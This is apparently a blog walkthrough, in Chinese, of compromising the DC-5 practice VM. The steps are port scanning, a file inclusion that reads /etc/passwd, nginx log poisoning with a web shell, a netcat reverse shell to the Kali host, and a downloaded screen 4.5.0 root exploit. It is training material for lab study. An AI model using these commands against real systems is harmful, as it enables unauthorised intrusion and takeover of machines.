## 环境配置。

我这里的话kali和DC-5都是设置为nat模式。

![image-20220327160949545](https://image.3001.net/images/20220327/1648381337_62404d99a7c97c3bd7b2c.png!small)

## 信息收集

### 判断IP

    
    
    arp-scan -l     #扫描指定网卡下面的全部IP。

![image-20220327161103934](https://image.3001.net/images/20220327/1648381338_62404d9ac7f2ef4eb88dd.png!small)

> 通过对比可以得到DC-5所在IP为192.168.79.134
>
> KALI IP:192.168.79.128
>
> DC-7 IP: 192.168.79.134

#### 判断开启的端口。

    
    
    nmap -p 1-65535 192.168.79.134  #扫描全部端口探测开启的服务。

![image-20220327161350541](https://image.3001.net/images/20220327/1648381340_62404d9c042599102adb8.png!small)

> 可以看到开启了80,111,56110端口。
>
> 111端口的rpcbind是个什么的不知道 百度下。
>
> 他是一个RPC服务，主要是在nfs共享时候负责通知客户端，服务器的nfs端口号的。简单理解rpc就是一个中介服务。不知道怎么用 等下再看看。

> 访问web页面 <http://192.168.79.134>

![image-20220327161935601](https://image.3001.net/images/20220327/1648381341_62404d9d1bb432ab04071.png!small)

## 漏洞发现

再对页面进行扫描的时候 发现。

![image-20220327162819738](https://image.3001.net/images/20220327/1648381342_62404d9e55211989b2e6d.png!small)

这个页面提交信息后。

![image-20220327162852894](https://image.3001.net/images/20220327/1648381343_62404d9f58084b0177bb8.png!small)

下面的这个东西每次都不一样。

![image-20220327162922242](https://image.3001.net/images/20220327/1648381344_62404da085c46cbd628b0.png!small)

![image-20220327163045741](https://image.3001.net/images/20220327/1648381345_62404da1aebafd1aa7fbe.png!small)

这里想到应该是调用了某个文件，我们可以测试测试文件包含。

前面参数删除，添加一个参数。

![image-20220327163320394](https://image.3001.net/images/20220327/1648381346_62404da2f12fead8264e5.png!small)

![image-20220327163348712](https://image.3001.net/images/20220327/1648381348_62404da441fe812baeb95.png!small)

加个字典。

![image-20220327163453311](https://image.3001.net/images/20220327/1648381349_62404da58f142b2deeac0.png!small)

然后运行即可。

可以看到 file的时候 不一样 可以基本确认参数是file。

![image-20220327163545291](https://image.3001.net/images/20220327/1648381350_62404da68fedd879c7eb5.png!small)

系统是linux系统 读取/etc/passwd 看看是否读取到信息。

![image-20220327163849866](https://image.3001.net/images/20220327/1648381351_62404da7db1a50281f7cd.png!small)

可以看到 确有文件包含漏洞。

## 反弹shell

通过Wappalyzer 可以发现我们这个web页面中间件是 nginx1.6.2。

nginx会自动记录我们的访问日志。

我们可以 访问请求里面写入一句话木马 然后读取nginx的日志 让我们获得shell。

![image-20220327164102940](https://image.3001.net/images/20220327/1648381353_62404da97c76fe5f778a5.png!small)

查看nginx的配置文件。

/etc/nginx/nginx.conf

![image-20220327165156815](https://image.3001.net/images/20220327/1648381354_62404daa96f479862f1ba.png!small)

可以看到 访问日志所在目录。

/var/log/nginx/access.log

![image-20220327165358792](https://image.3001.net/images/20220327/1648381358_62404dae1d8bfd1928d39.png!small)

可以成功读取到访问日志。

我们尝试发送了一句话木马 密码 attack。

![image-20220327170448352](https://image.3001.net/images/20220327/1648381364_62404db48e5e8d63640ca.png!small)

然后蚁剑连接。

![image-20220327170532644](https://image.3001.net/images/20220327/1648381365_62404db5e127c460a4979.png!small)

![image-20220327170555165.png](https://image.3001.net/images/20220327/1648381366_62404db6e35d44989a388.png!small)

成功进入 然后用蚁剑自带的打开终端 进行反弹shell。

![image-20220327170709092](https://image.3001.net/images/20220327/1648381368_62404db82dcfdcf4973dd.png!small)

    
    
    #kali  
    nc -lvvp 8888  
    #蚁剑  
    nc 192.168.79.128 8888 -e /bin/bash

![image-20220327171239264](https://image.3001.net/images/20220327/1648381369_62404db9471143a00db2c.png!small)

成功反弹shell。

> python -c "import pty;pty.spawn('/bin/bash')" ###交互式页面

![image-20220327171457779](https://image.3001.net/images/20220327/1648381370_62404dbac9f2187b4b684.png!small)

## 提权

    
    
    #先具有SUID的命令  
    find / -user root -perm -4000 -print 2>/dev/null

![image-20220327173209913](https://image.3001.net/images/20220327/1648381372_62404dbc22b67949fca80.png!small)

发现有个 screen-4.5.0 有嫌疑 去kali看看有没有相关的exp。

    
    
    searchsploit screen 4.5.0

![image-20220327192615255](https://image.3001.net/images/20220327/1648381373_62404dbd2c00d449eb901.png!small)

用上面这个 可以 直接运行 比较简单。

    
    
    systemctl start apache2.service     #启动阿帕奇  
    rm /var/www/html/* -rf              #删除阿帕奇里面的默认页面  
    cp /usr/share/exploitdb/exploits/linux/local/41154.sh /var/www/html  
    # 把前面的exp复制到阿帕奇里面

回到反弹DC-5的页面。

    
    
    #切换目录到tmp下面 一般tmp下面可以wget下载文件权限也高一点  
    cd /tmp  
    wget http://192.168.79.128/41154.sh     #下载kali内的文件  
    chmod 777 41154.sh                      #给文件执行权限

![image-20220327193213598](https://image.3001.net/images/20220327/1648381374_62404dbe332f7057e73d9.png!small)

![image-20220327193229453](https://image.3001.net/images/20220327/1648381375_62404dbf3af01d1af67c8.png!small)

直接运行会报错。

![image-20220327193252720](https://image.3001.net/images/20220327/1648381375_62404dbfdb71f1ab3dbaa.png!small)

> > 执行脚本的时候提示 “/bin/bash^M: bad interpreter: No such file or directory”
> 的错误是由于脚本文件是 dos 格式，即每一行结尾以 \r\n 来标识，而 unix 格式的文件结尾以 \n 来标识
>  
>  
>     查看脚本文件是dos格式还是unix格式的几种办法。  
>     > cat -A filename  从显示结果可以判断，dos格式的文件行尾为^M$，unix格式的文件行尾为$。  
>     > od -t x1 filename 如果看到输出内容中存在0d 0a的字符，那么文件是dos格式，如果只有0a，则是unix格式。  
>     > vi filename打开文件，执行 : set
> ff，如果文件为dos格式在显示为fileformat=dos，如果是unxi则显示为fileformat=unix。
>  
>  
>     解决方法：  
>     > 使用linux命令dos2unix filename，直接把文件转换为unix格式  
>     > 使用sed命令sed -i "s/\r//" filename  或者 sed -i "s/^M//"
> filename直接替换结尾符为unix格式  
>     > vi filename打开文件，执行 : set ff=unix 设置文件为unix，然后执行:wq，保存成unix格式。
    
    
    sed -i "s/\r//" 41154.sh    #切换编码格式  
    ./41154.sh                  #运行 

![image-20220327193450690](https://image.3001.net/images/20220327/1648381376_62404dc0a46e2d746e04b.png!small)

    
    
    # 最后 访问 /root 目录下的thisistheflag.txt 文件即可  
    cd /root  
    cat thisistheflag.txt

![image-20220327193759692](https://image.3001.net/images/20220327/1648381377_62404dc1c1c3986065805.png!small)

## 总结

  * 文件包含漏洞

  * nginx 日志会记录用户请求

  * screen-4.5.0 提权

